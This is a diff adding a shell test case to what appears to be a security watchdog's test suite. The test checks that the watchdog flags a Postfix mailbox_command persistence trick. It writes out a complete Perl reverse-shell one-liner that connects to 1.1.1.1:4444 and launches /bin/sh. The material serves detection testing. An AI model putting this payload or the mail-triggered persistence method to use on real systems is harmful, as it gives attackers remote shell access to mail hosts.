@@ -301,3 +301,17 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on postfix mail-delivery surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp postfix
+    # mailbox_command rev-shell variants. Perl on every Debian/
+    # Ubuntu host. Locks perl axis on T1546 mail-triggered exec
+    # — mailbox_command runs AS recipient user/root on every
+    # delivered message, remotely-triggerable by sender.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'mailbox_command = perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${MAIN}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
